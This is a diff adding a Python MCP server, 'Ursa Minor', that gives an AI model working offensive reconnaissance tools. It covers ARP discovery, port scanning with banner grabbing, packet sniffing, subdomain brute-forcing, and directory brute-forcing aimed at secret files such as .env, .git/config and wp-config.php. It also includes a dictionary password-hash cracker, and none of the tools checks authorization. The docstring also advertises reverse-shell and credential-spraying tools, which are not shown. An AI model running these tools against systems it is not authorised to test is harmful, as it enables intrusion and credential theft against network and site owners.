@@ -1,0 +1,1753 @@
+#!/usr/bin/env python3
+"""
+Ursa Minor — Recon & Scanning Toolkit
+======================================
+MCP server exposing network reconnaissance tools so Claude can run
+scans directly from conversation.
+
+Part of the Ursa offensive security framework by Bare Labs.
+
+Tools:
+  - discover_network: ARP scan to find all devices on the network
+  - scan_ports:       Port scan a specific target
+  - sniff_packets:    Capture and analyze network packets
+  - full_recon:       Discover hosts + scan all their ports
+  - lookup_service:   Identify what a port/service is
+  - get_my_network_info: Get local network info
+  - enumerate_subdomains: Find subdomains via CT + brute-force
+  - dirbust:          Directory brute-forcing
+  - crack_hash:       Dictionary attack on password hashes
+  - identify_hash:    Identify hash type
+  - generate_reverse_shell: Generate reverse shell payloads
+  - credential_spray: Brute-force credentials
+  - vuln_scan:        Web vulnerability scanner
+  - os_fingerprint:   OS identification via TCP/IP analysis
+  - smb_enum:         SMB share/version enumeration
+  - snmp_scan:        SNMP device interrogation
+
+Run with:
+    sudo /path/to/ursa/venv/bin/python3 minor/server.py
+"""
+
+import sys
+import os
+import io
+import socket
+import struct
+import fcntl
+from contextlib import redirect_stdout
+from datetime import datetime
+
+from mcp.server.fastmcp import FastMCP
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from scapy.all import ARP, Ether, srp, IP, TCP, UDP, DNS, DNSQR, DNSRR, ICMP, Raw, conf
+from scapy.all import sniff as scapy_sniff, sr1
+
+conf.verb = 0
+
+mcp_server = FastMCP(
+    "ursa-minor",
+    instructions="""Ursa Minor — the recon & scanning component of the Ursa framework.
+    You have access to network reconnaissance, vulnerability scanning, credential
+    testing, and enumeration tools. Most tools require the server to be running
+    with sudo for raw network access.""",
+)
+
+
+# ── Helpers ──
+
+
+MAC_VENDORS = {
+    "00:50:56": "VMware", "00:0c:29": "VMware", "08:00:27": "VirtualBox",
+    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
+    "3c:22:fb": "Apple", "a4:83:e7": "Apple", "f8:ff:c2": "Apple",
+    "ac:de:48": "Apple", "14:7d:da": "Apple", "88:e9:fe": "Apple",
+    "d0:03:4b": "Apple", "a8:88:08": "Apple", "50:ed:3c": "Apple",
+    "48:d7:05": "Apple", "8c:85:90": "Apple", "d8:30:62": "Apple",
+    "34:36:3b": "Apple", "70:56:81": "Apple", "d4:61:9d": "Apple",
+    "18:af:61": "Apple", "54:26:96": "Apple", "28:cf:da": "Apple",
+    "00:17:f2": "Apple", "ac:87:a3": "Apple", "f0:18:98": "Apple",
+    "70:3e:ac": "Apple", "c8:69:cd": "Apple", "80:e6:50": "Apple",
+    "00:23:12": "Apple", "d0:4f:7e": "Apple", "60:f8:1d": "Apple",
+    "90:72:40": "Samsung", "00:1a:8a": "Samsung", "ec:1f:72": "Samsung",
+    "b4:79:a7": "Google", "f4:f5:d8": "Google", "54:60:09": "Google",
+    "00:1a:6b": "Intel", "68:05:ca": "Intel", "3c:97:0e": "Intel",
+    "00:e0:4c": "Realtek", "52:54:00": "QEMU/KVM",
+    "b0:be:76": "TP-Link", "50:c7:bf": "TP-Link", "ec:08:6b": "TP-Link",
+    "00:1e:58": "D-Link", "1c:7e:e5": "D-Link",
+    "24:a4:3c": "Ubiquiti", "78:8a:20": "Ubiquiti",
+    "20:a6:cd": "Netgear", "c4:04:15": "Netgear", "00:14:6c": "Netgear",
+}
+
+COMMON_PORTS = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MS-RPC",
+    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
+    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
+    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
+    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
+    9090: "Web-Mgmt", 27017: "MongoDB",
+}
+
+TOP_PORTS = [
+    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
+    1433, 1521, 1723, 3306, 3389, 5432, 5900, 5901, 6379, 8080, 8443,
+    8888, 9090, 27017, 3000, 5000, 8000, 4443, 9200, 10000,
+]
+
+QUICK_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 5900,
+               6379, 8080, 8443, 8888, 9090, 27017, 5000, 8000]
+
+
+def _get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+def _get_netmask(ifname="en0"):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        result = fcntl.ioctl(s.fileno(), 0xC0206919, struct.pack("256s", ifname.encode()))
+        return socket.inet_ntoa(result[20:24])
+    except Exception:
+        return "255.255.255.0"
+
+
+def _calculate_cidr(ip, netmask):
+    ip_parts = [int(x) for x in ip.split(".")]
+    mask_parts = [int(x) for x in netmask.split(".")]
+    network = [ip_parts[i] & mask_parts[i] for i in range(4)]
+    mask_int = sum(mask_parts[i] << (24 - 8 * i) for i in range(4))
+    prefix_len = bin(mask_int).count("1")
+    return f"{'.'.join(map(str, network))}/{prefix_len}"
+
+
+def _get_network_range():
+    local_ip = _get_local_ip()
+    netmask = _get_netmask()
+    return _calculate_cidr(local_ip, netmask), local_ip
+
+
+def _lookup_vendor(mac):
+    prefix = mac[:8].lower()
+    return MAC_VENDORS.get(prefix, "Unknown")
+
+
+def _grab_banner(ip, port, timeout=2):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        try:
+            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
+        except socket.timeout:
+            if port in (80, 8080, 8000, 8888, 443, 8443):
+                s.send(b"HEAD / HTTP/1.1\r\nHost: target\r\n\r\n")
+                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
+                for line in banner.split("\r\n"):
+                    if line.lower().startswith("server:"):
+                        banner = line
+                        break
+            else:
+                banner = ""
+        s.close()
+        return banner[:100] if banner else ""
+    except Exception:
+        return ""
+
+
+def _tcp_connect_scan(ip, port, timeout=1):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((ip, port))
+        s.close()
+        return result == 0
+    except Exception:
+        return False
+
+
+# ── MCP Tools ──
+
+
+@mcp_server.tool()
+def discover_network(target_range: str | None = None, timeout: int = 3) -> str:
+    """
+    Discover all devices on the local network using ARP scanning.
+
+    Sends ARP requests to find every device connected to the WiFi/LAN.
+    Returns IP addresses, MAC addresses, and device vendors.
+
+    Args:
+        target_range: Network range in CIDR notation (e.g., "192.168.1.0/24").
+                      If not provided, auto-detects your local network.
+        timeout: Seconds to wait for responses (default 3).
+    """
+    local_ip = _get_local_ip()
+
+    if not target_range:
+        target_range, _ = _get_network_range()
+
+    arp_request = ARP(pdst=target_range)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = broadcast / arp_request
+    answered, _ = srp(packet, timeout=timeout, retry=1)
+
+    devices = []
+    for sent, received in answered:
+        vendor = _lookup_vendor(received.hwsrc)
+        devices.append({
+            "ip": received.psrc,
+            "mac": received.hwsrc,
+            "vendor": vendor,
+        })
+
+    if not devices:
+        return "No devices found. Make sure the server is running with sudo."
+
+    devices.sort(key=lambda d: [int(x) for x in d["ip"].split(".")])
+
+    lines = [
+        f"Network: {target_range}",
+        f"Your IP: {local_ip}",
+        f"Devices found: {len(devices)}",
+        "",
+        f"{'IP Address':<18} {'MAC Address':<20} {'Vendor':<15} Notes",
+        "-" * 70,
+    ]
+
+    for d in devices:
+        notes = ""
+        if d["ip"] == local_ip:
+            notes = "<-- YOU"
+        elif d["ip"].endswith(".1"):
+            notes = "<-- likely gateway"
+        lines.append(f"{d['ip']:<18} {d['mac']:<20} {d['vendor']:<15} {notes}")
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def scan_ports(
+    target: str,
+    ports: str | None = None,
+    scan_all: bool = False,
+    quick: bool = False,
+    timeout: float = 1.0,
+    threads: int = 100,
+) -> str:
+    """
+    Scan open ports on a target IP address.
+
+    Performs a TCP connect scan to find open services on the target.
+    Includes banner grabbing to identify service versions.
+
+    Args:
+        target: Target IP address to scan.
+        ports: Port specification — comma-separated or range
+               (e.g., "22,80,443" or "1-1024"). If not provided,
+               scans top ~100 common ports.
+        scan_all: If True, scan all 65535 ports (slow).
+        quick: If True, scan only top 20 ports (fast).
+        timeout: Timeout per port in seconds (default 1.0).
+        threads: Number of concurrent threads (default 100).
+    """
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    if ports:
+        port_list = []
+        for part in ports.split(","):
+            part = part.strip()
+            if "-" in part:
+                start, end = part.split("-", 1)
+                port_list.extend(range(int(start), int(end) + 1))
+            else:
+                port_list.append(int(part))
+        port_list = sorted(set(port_list))
+    elif scan_all:
+        port_list = list(range(1, 65536))
+    elif quick:
+        port_list = QUICK_PORTS
+    else:
+        port_list = TOP_PORTS
+
+    start_time = datetime.now()
+    open_ports = []
+
+    def check_port(port):
+        is_open = _tcp_connect_scan(target, port, timeout)
+        return (port, is_open)
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(check_port, p): p for p in port_list}
+        for future in as_completed(futures):
+            port, is_open = future.result()
+            if is_open:
+                service = COMMON_PORTS.get(port, "unknown")
+                banner = _grab_banner(target, port)
+                open_ports.append({
+                    "port": port,
+                    "service": service,
+                    "banner": banner,
+                })
+
+    duration = (datetime.now() - start_time).total_seconds()
+    open_ports.sort(key=lambda x: x["port"])
+
+    lines = [
+        f"Port Scan Results for {target}",
+        f"Ports scanned: {len(port_list)}",
+        f"Duration: {duration:.1f}s",
+        "",
+    ]
+
+    if not open_ports:
+        lines.append("No open ports found.")
+        lines.append("Host may be down, all ports closed, or firewall blocking.")
+    else:
+        lines.append(f"{'Port':<8} {'Service':<15} {'Banner'}")
+        lines.append("-" * 55)
+        for p in open_ports:
+            lines.append(f"{p['port']:<8} {p['service']:<15} {p['banner']}")
+        lines.append(f"\n{len(open_ports)} open ports found")
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def sniff_packets(
+    count: int = 50,
+    filter_expr: str | None = None,
+    dns_only: bool = False,
+    interface: str | None = None,
+    timeout: int = 30,
+) -> str:
+    """
+    Capture and analyze network packets.
+
+    Sniffs live network traffic and returns a summary of captured packets
+    including protocols, connections, and DNS queries.
+
+    Args:
+        count: Number of packets to capture (default 50, max 500).
+        filter_expr: BPF filter expression, e.g.:
+                     "tcp port 80" — HTTP traffic
+                     "udp port 53" — DNS only
+                     "host 192.168.1.1" — specific host
+                     "not port 22" — exclude SSH
+        dns_only: If True, only capture and report DNS queries.
+        interface: Network interface to sniff on (default: auto).
+        timeout: Max seconds to capture (default 30). Safety limit.
+    """
+    from collections import Counter
+
+    count = min(count, 500)
+
+    if dns_only and not filter_expr:
+        filter_expr = "udp port 53"
+
+    results = {
+        "packets": [],
+        "dns_queries": [],
+        "connections": set(),
+        "stats": Counter(),
+    }
+
+    def process(pkt):
+        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
+            if pkt[DNS].qr == 0:
+                query = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
+                results["dns_queries"].append(query)
+                results["stats"]["DNS"] += 1
+            elif pkt[DNS].qr == 1 and pkt.haslayer(DNSRR):
+                results["stats"]["DNS"] += 1
+
+        if not pkt.haslayer(IP):
+            if pkt.haslayer(ARP):
+                results["stats"]["ARP"] += 1
+            return
+
+        ip = pkt[IP]
+
+        if pkt.haslayer(TCP):
+            results["stats"]["TCP"] += 1
+            tcp = pkt[TCP]
+            results["connections"].add(
+                (ip.src, tcp.sport, ip.dst, tcp.dport)
+            )
+            service = COMMON_PORTS.get(tcp.dport, COMMON_PORTS.get(tcp.sport, ""))
+            results["packets"].append(
+                f"TCP  {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} {service}"
+            )
+        elif pkt.haslayer(UDP):
+            results["stats"]["UDP"] += 1
+            udp = pkt[UDP]
+            results["packets"].append(
+                f"UDP  {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}"
+            )
+        elif pkt.haslayer(ICMP):
+            results["stats"]["ICMP"] += 1
+            results["packets"].append(
+                f"ICMP {ip.src} -> {ip.dst}"
+            )
+
+    try:
+        scapy_sniff(
+            iface=interface,
+            filter=filter_expr,
+            prn=process,
+            count=count,
+            store=False,
+            timeout=timeout,
+        )
+    except PermissionError:
+        return "Permission denied. The MCP server must be running with sudo."
+
+    lines = [
+        f"Packet Capture Summary",
+        f"Captured: {sum(results['stats'].values())} packets",
+        "",
+    ]
+
+    if results["stats"]:
+        lines.append("Protocol Breakdown:")
+        for proto, cnt in results["stats"].most_common():
+            lines.append(f"  {proto:<8} {cnt}")
+        lines.append("")
+
+    if results["dns_queries"]:
+        dns_counts = Counter(results["dns_queries"])
+        lines.append(f"DNS Queries ({len(results['dns_queries'])} total):")
+        for domain, cnt in dns_counts.most_common(20):
+            lines.append(f"  {cnt:>4}x  {domain}")
+        lines.append("")
+
+    lines.append(f"Unique connections: {len(results['connections'])}")
+
+    if not dns_only and results["packets"]:
+        lines.append("")
+        lines.append("Recent packets (last 30):")
+        for pkt_line in results["packets"][-30:]:
+            lines.append(f"  {pkt_line}")
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def full_recon(
+    target_range: str | None = None,
+    quick: bool = True,
+    threads: int = 50,
+) -> str:
+    """
+    Run full network reconnaissance: discover hosts then scan all their ports.
+
+    Phase 1: ARP scan to discover all live hosts.
+    Phase 2: Port scan each discovered host.
+
+    Returns a full report of the network's attack surface.
+
+    Args:
+        target_range: Network range in CIDR (e.g., "192.168.1.0/24").
+                      Auto-detects if not provided.
+        quick: If True, scan top 20 ports per host (faster).
+                If False, scan top 100 ports (more thorough).
+        threads: Threads per host for port scanning (default 50).
+    """
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    local_ip = _get_local_ip()
+
+    if not target_range:
+        target_range, _ = _get_network_range()
+
+    start_time = datetime.now()
+    ports = QUICK_PORTS if quick else TOP_PORTS
+
+    arp_request = ARP(pdst=target_range)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    answered, _ = srp(broadcast / arp_request, timeout=3, retry=1)
+
+    devices = []
+    for sent, received in answered:
+        devices.append({
+            "ip": received.psrc,
+            "mac": received.hwsrc,
+            "vendor": _lookup_vendor(received.hwsrc),
+        })
+
+    if not devices:
+        return "No hosts discovered. Make sure server is running with sudo."
+
+    devices.sort(key=lambda d: [int(x) for x in d["ip"].split(".")])
+
+    host_results = {}
+    for device in devices:
+        ip = device["ip"]
+        if ip == local_ip:
+            continue
+
+        open_ports = []
+
+        def check_port(port, _ip=ip):
+            return (port, _tcp_connect_scan(_ip, port, timeout=1))
+
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(check_port, p): p for p in ports}
+            for future in as_completed(futures):
+                port, is_open = future.result()
+                if is_open:
+                    service = COMMON_PORTS.get(port, "unknown")
+                    banner = _grab_banner(ip, port)
+                    open_ports.append({
+                        "port": port,
+                        "service": service,
+                        "banner": banner,
+                    })
+
+        open_ports.sort(key=lambda x: x["port"])
+        host_results[ip] = {
+            "mac": device["mac"],
+            "vendor": device["vendor"],
+            "open_ports": open_ports,
+        }
+
+    duration = (datetime.now() - start_time).total_seconds()
+
+    lines = [
+        "=" * 60,
+        "URSA MINOR — NETWORK RECONNAISSANCE REPORT",
+        "=" * 60,
+        f"Target:   {target_range}",
+        f"Your IP:  {local_ip}",
+        f"Mode:     {'Quick' if quick else 'Standard'}",
+        f"Duration: {duration:.1f}s",
+        f"Hosts:    {len(devices)} discovered",
+        "",
+    ]
+
+    total_open = 0
+    for ip, data in sorted(host_results.items()):
+        if not data["open_ports"]:
+            lines.append(f"-- {ip} ({data['vendor']}) [{data['mac']}] — no open ports")
+            continue
+
+        total_open += len(data["open_ports"])
+        lines.append(f"-- {ip} ({data['vendor']}) [{data['mac']}]")
+        for p in data["open_ports"]:
+            banner_info = f" — {p['banner']}" if p.get("banner") else ""
+            lines.append(f"   {p['port']:<6} {p['service']:<15}{banner_info}")
+        lines.append(f"   ({len(data['open_ports'])} open ports)")
+        lines.append("")
+
+    lines.append(f"Total: {len(devices)} hosts, {total_open} open ports")
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def lookup_service(port: int) -> str:
+    """
+    Look up what service typically runs on a given port number.
+
+    Args:
+        port: The port number to look up (1-65535).
+    """
+    service = COMMON_PORTS.get(port)
+    if service:
+        return f"Port {port}: {service}"
+
+    try:
+        name = socket.getservbyport(port)
+        return f"Port {port}: {name} (from system services database)"
+    except OSError:
+        return f"Port {port}: No well-known service. Could be a custom application."
+
+
+@mcp_server.tool()
+def get_my_network_info() -> str:
+    """
+    Get info about your current network connection.
+
+    Returns your local IP, network range, and gateway.
+    """
+    local_ip = _get_local_ip()
+    netmask = _get_netmask()
+    network = _calculate_cidr(local_ip, netmask)
+
+    lines = [
+        f"Local IP:  {local_ip}",
+        f"Netmask:   {netmask}",
+        f"Network:   {network}",
+    ]
+
+    try:
+        import subprocess
+        result = subprocess.run(
+            ["route", "-n", "get", "default"],
+            capture_output=True, text=True, timeout=5,
+        )
+        for line in result.stdout.splitlines():
+            if "gateway" in line.lower():
+                lines.append(f"Gateway:   {line.split(':')[-1].strip()}")
+                break
+    except Exception:
+        pass
+
+    return "\n".join(lines)
+
+
+# ── Web Recon Tools ──
+
+
+@mcp_server.tool()
+def enumerate_subdomains(
+    domain: str,
+    ct_only: bool = False,
+    threads: int = 50,
+) -> str:
+    """
+    Discover subdomains of a target domain using DNS brute-force and
+    Certificate Transparency logs.
+
+    Finds hidden attack surface like dev.target.com, staging.target.com,
+    admin.target.com that might be less secured than the main site.
+
+    Args:
+        domain: Target domain (e.g., "example.com")
+        ct_only: If True, only use Certificate Transparency (passive, no
+                 direct contact with target)
+        threads: Number of concurrent DNS resolution threads (default 50)
+    """
+    import json as json_mod
+    import urllib.request
+    import urllib.error
+
+    subdomain_words = [
+        "dev", "development", "staging", "stage", "stg", "test", "testing",
+        "qa", "uat", "sandbox", "demo", "beta", "alpha", "preview",
+        "pre-prod", "preprod", "next",
+        "api", "api2", "api-v2", "api-dev", "api-staging", "api-test",
+        "app", "application", "web", "www", "www2", "www3",
+        "mail", "email", "smtp", "pop", "imap", "webmail", "mx",
+        "ftp", "sftp", "ssh", "vpn", "remote", "gateway", "gw",
+        "proxy", "cdn", "cache", "edge", "lb",
+        "ns", "ns1", "ns2", "ns3", "dns", "dns1", "dns2",
+        "admin", "administrator", "panel", "portal", "manage", "management",
+        "dashboard", "console", "control", "cp", "cpanel",
+        "cms", "backend", "backoffice", "internal", "intranet",
+        "db", "database", "mysql", "postgres", "mongo", "redis",
+        "elastic", "elasticsearch", "kibana", "grafana", "prometheus",
+        "jenkins", "ci", "cd", "gitlab", "git", "bitbucket",
+        "jira", "confluence", "wiki", "docs", "documentation",
+        "sentry", "monitor", "monitoring", "status", "health",
+        "log", "logs", "logging",
+        "files", "upload", "uploads", "media", "assets", "static",
+        "storage", "s3", "backup", "backups", "archive",
+        "auth", "login", "sso", "oauth", "identity", "id", "accounts",
+        "chat", "blog", "news", "forum", "community", "support", "help",
+        "cloud", "aws", "azure", "gcp",
+        "shop", "store", "pay", "payment", "billing",
+        "search", "analytics", "track", "tracking",
+        "m", "mobile", "old", "new", "legacy", "v1", "v2", "v3",
+        "lab", "labs", "research", "data",
+        "crm", "erp", "hr", "corp", "corporate",
+        "exchange", "autodiscover", "owa",
+    ]
+
+    all_subdomains = {}
+
+    ct_subs = set()
+    try:
+        url = f"https://crt.sh/?q=%.{domain}&output=json"
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=15) as response:
+            data = json_mod.loads(response.read())
+            for entry in data:
+                name = entry.get("name_value", "")
+                for sub in name.split("\n"):
+                    sub = sub.strip().lower().lstrip("*.")
+                    if sub and sub != domain and sub.endswith(f".{domain}"):
+                        ct_subs.add(sub)
+    except Exception:
+        pass
+
+    from concurrent.futures import ThreadPoolExecutor, as_completed as asc
+
+    def resolve(fqdn):
+        try:
+            answers = socket.getaddrinfo(fqdn, None)
+            ips = list(set(a[4][0] for a in answers))
+            return fqdn, ips
+        except Exception:
+            return fqdn, None
+
+    if ct_subs:
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(resolve, sub): sub for sub in ct_subs}
+            for f in asc(futures):
+                sub, ips = f.result()
+                if ips:
+                    all_subdomains[sub] = ips
+
+    if not ct_only:
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {}
+            for word in subdomain_words:
+                fqdn = f"{word}.{domain}"
+                futures[executor.submit(resolve, fqdn)] = word
+
+            for f in asc(futures):
+                sub, ips = f.result()
+                if ips:
+                    all_subdomains[sub] = ips
+
+    lines = [
+        f"Subdomain Enumeration: {domain}",
+        f"CT results: {len(ct_subs)} found",
+        f"Total resolved: {len(all_subdomains)}",
+        "",
+    ]
+
+    if not all_subdomains:
+        lines.append("No subdomains found.")
+    else:
+        lines.append(f"{'Subdomain':<45} {'IP Address'}")
+        lines.append("-" * 65)
+        for sub, ips in sorted(all_subdomains.items()):
+            lines.append(f"{sub:<45} {', '.join(ips)}")
+
+        ip_to_subs = {}
+        for sub, ips in all_subdomains.items():
+            for ip in ips:
+                ip_to_subs.setdefault(ip, []).append(sub)
+        shared = {ip: subs for ip, subs in ip_to_subs.items() if len(subs) > 1}
+        if shared:
+            lines.append("\nShared hosting detected:")
+            for ip, subs in shared.items():
+                lines.append(f"  {ip}: {', '.join(subs[:5])}")
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def dirbust(
+    url: str,
+    extensions: str | None = None,
+    threads: int = 20,
+    timeout: float = 5.0,
+) -> str:
+    """
+    Discover hidden files and directories on a web server by brute-forcing
+    common paths. Finds admin panels, config files, backups, API docs, etc.
+
+    Args:
+        url: Target URL (e.g., "http://target.com")
+        extensions: Comma-separated file extensions to try
+                    (e.g., "php,html,txt")
+        threads: Concurrent request threads (default 20, be respectful)
+        timeout: Request timeout in seconds (default 5.0)
+    """
+    import urllib.request
+    import urllib.error
+
+    wordlist = [
+        "admin", "login", "dashboard", "panel", "api", "api/v1", "api/v2",
+        "api/docs", "swagger", "swagger.json", "graphql", "graphiql",
+        "health", "status", "info", "version", "metrics",
+        ".git", ".git/config", ".git/HEAD", ".env", ".env.local",
+        "config", "config.php", "config.json", "settings",
+        ".htaccess", ".htpasswd", "phpinfo.php", "wp-config.php",
+        "backup", "backups", "backup.sql", "backup.zip", "db.sql",
+        "uploads", "upload", "files", "media", "static",
+        "tmp", "temp", "cache", "logs", "log",
+        "robots.txt", "sitemap.xml", "security.txt",
+        ".well-known/security.txt",
+        "phpmyadmin", "adminer", "jenkins", "manager", "console",
+        "test", "debug", "dev", "staging",
+        "wp-admin", "wp-login.php", "wp-content", "wp-json",
+        "wp-json/wp/v2/users", "xmlrpc.php",
+        "server-status", "server-info",
+        "user", "users", "account", "register",
+        "docs", "documentation", "readme",
+    ]
+
+    paths = list(wordlist)
+    if extensions:
+        for word in wordlist:
+            for ext in extensions.split(","):
+                paths.append(f"{word}.{ext.strip()}")
+    paths = list(set(paths))
+
+    show_codes = {200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 500}
+    results = []
+
+    def check_path(path):
+        target = f"{url.rstrip('/')}/{path}"
+        try:
+            req = urllib.request.Request(target, method="GET")
+            req.add_header("User-Agent",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+            response = urllib.request.urlopen(req, timeout=timeout)
+            size = len(response.read(10000))
+            return path, response.status, size
+        except urllib.error.HTTPError as e:
+            return path, e.code, 0
+        except Exception:
+            return path, 0, 0
+
+    from concurrent.futures import ThreadPoolExecutor, as_completed as asc
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(check_path, p): p for p in paths}
+        for f in asc(futures):
+            path, status, size = f.result()
+            if status in show_codes:
+                results.append({"path": path, "status": status, "size": size})
+
+    results.sort(key=lambda x: (x["status"], x["path"]))
+
+    lines = [
+        f"Directory Brute-Force: {url}",
+        f"Paths tested: {len(paths)}",
+        "",
+    ]
+
+    if not results:
+        lines.append("No interesting paths found.")
+    else:
+        by_status = {}
+        for r in results:
+            by_status.setdefault(r["status"], []).append(r)
+
+        status_labels = {
+            200: "OK (Accessible)", 301: "Redirect", 302: "Redirect",
+            401: "Unauthorized", 403: "Forbidden", 500: "Server Error",
+        }
+
+        for status in sorted(by_status.keys()):
+            label = status_labels.get(status, f"Status {status}")
+            lines.append(f"[{status}] {label}:")
+            for r in sorted(by_status[status], key=lambda x: x["path"]):
+                lines.append(f"  /{r['path']}  ({r['size']}B)")
+            lines.append("")
+
+        critical = [r for r in results if any(
+            k in r["path"].lower()
+            for k in [".env", ".git", "backup", "config", "admin",
+                      "phpinfo", "wp-config", "database", "dump"]
+        ) and r["status"] in (200, 403)]
+        if critical:
+            lines.append("CRITICAL FINDINGS:")
+            for r in critical:
+                lines.append(f"  [{r['status']}] /{r['path']}")
+
+    lines.append(f"\n{len(results)} paths found")
+    return "\n".join(lines)
+
+
+# ── Credential Tools ──
+
+
+@mcp_server.tool()
+def crack_hash(
+    target_hash: str,
+    use_rules: bool = False,
+) -> str:
+    """
+    Attempt to crack a password hash using dictionary attack.
+
+    Supports MD5, SHA1, SHA256, SHA512. Identifies the hash type
+    automatically. Uses a built-in common password list.
+
+    Args:
+        target_hash: The hash string to crack
+        use_rules: Apply mutation rules (capitalize, add numbers,
+                   leet speak) to expand the wordlist
+    """
+    import hashlib
+    import time
+
+    h = target_hash.strip()
+    length = len(h)
+    if length == 32 and all(c in '0123456789abcdefABCDEF' for c in h):
+        hash_type = "md5"
+    elif length == 40 and all(c in '0123456789abcdefABCDEF' for c in h):
+        hash_type = "sha1"
+    elif length == 64 and all(c in '0123456789abcdefABCDEF' for c in h):
+        hash_type = "sha256"
+    elif length == 128 and all(c in '0123456789abcdefABCDEF' for c in h):
+        hash_type = "sha512"
+    else:
+        return f"Unknown hash type (length {length}). Supported: MD5(32), SHA1(40), SHA256(64), SHA512(128)"
+
+    hash_funcs = {
+        "md5": hashlib.md5, "sha1": hashlib.sha1,
+        "sha256": hashlib.sha256, "sha512": hashlib.sha512,
+    }
+    hash_func = hash_funcs[hash_type]
+
+    words = [
+        "password", "123456", "12345678", "qwerty", "abc123",
+        "monkey", "1234567", "letmein", "trustno1", "dragon",
+        "baseball", "iloveyou", "master", "sunshine", "ashley",
+        "bailey", "passw0rd", "shadow", "123123", "654321",
+        "superman", "qazwsx", "michael", "football", "password1",
+        "password123", "batman", "login", "welcome", "admin",
+        "admin123", "root", "toor", "pass", "changeme",
+        "default", "guest", "test", "test123", "temp",
+        "temp123", "p@ssw0rd", "P@ssw0rd", "P@ssword1",
+        "Summer2024", "Winter2024", "Spring2024", "Fall2024",
+        "Summer2025", "Winter2025", "Spring2025", "Fall2025",
+        "Company1", "Company123", "Welcome1", "Welcome123",
+        "Qwerty123", "Password1!", "P@ssw0rd!", "Admin123!",
+        "1234567890", "123456789", "000000", "1q2w3e4r",
+        "1qaz2wsx", "qwer1234", "zaq1xsw2",
+        "111111", "aaaaaa", "abcdef",
+    ]
+
+    candidates = []
+    for word in words:
+        candidates.append(word)
+        if use_rules:
+            candidates.append(word.capitalize())
+            candidates.append(word.upper())
+            for suffix in ["1", "12", "123", "!", "1!", "123!",
+                           "2024", "2025", "2026", "@1", "#1"]:
+                candidates.append(word + suffix)
+                candidates.append(word.capitalize() + suffix)
+            leet_map = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"}
+            leet = word
+            for c, r in leet_map.items():
+                leet = leet.replace(c, r)
+            if leet != word:
+                candidates.append(leet)
+
+    candidates = list(set(candidates))
+    target_lower = h.lower()
+    start = time.time()
+
+    for i, candidate in enumerate(candidates):
+        hashed = hash_func(candidate.encode()).hexdigest()
+        if hashed == target_lower:
+            duration = time.time() - start
+            return (
+                f"CRACKED!\n"
+                f"Password:  {candidate}\n"
+                f"Hash type: {hash_type}\n"
+                f"Attempts:  {i + 1}\n"
+                f"Time:      {duration:.2f}s"
+            )
+
+    duration = time.time() - start
+    return (
+        f"Not cracked\n"
+        f"Hash type: {hash_type}\n"
+        f"Attempts:  {len(candidates)}\n"
+        f"Time:      {duration:.2f}s\n"
+        f"Try a larger wordlist or use the standalone hashcrack.py with --rules"
+    )
+
+
+@mcp_server.tool()
+def identify_hash(hash_str: str) -> str:
+    """
+    Identify the type of a password hash.
+
+    Args:
+        hash_str: The hash string to identify
+    """
+    h = hash_str.strip()
+
+    if h.startswith(("$2a$", "$2b$", "$2y$")):
+        return f"bcrypt (adaptive, slow — designed for passwords)\nLength: {len(h)}"
+    if h.startswith("$1$"):
+        return f"MD5 crypt (Unix)\nLength: {len(h)}"
+    if h.startswith("$5$"):
+        return f"SHA-256 crypt (Unix)\nLength: {len(h)}"
+    if h.startswith("$6$"):
+        return f"SHA-512 crypt (Unix)\nLength: {len(h)}"
+
+    length = len(h)
+    is_hex = all(c in '0123456789abcdefABCDEF' for c in h)
+
+    if is_hex:
+        types = {
+            32: "MD5 (or NTLM if Windows)",
+            40: "SHA-1",
+            64: "SHA-256",
+            128: "SHA-512",
+        }
+        if length in types:
+            return f"{types[length]}\nLength: {length} hex chars"
+
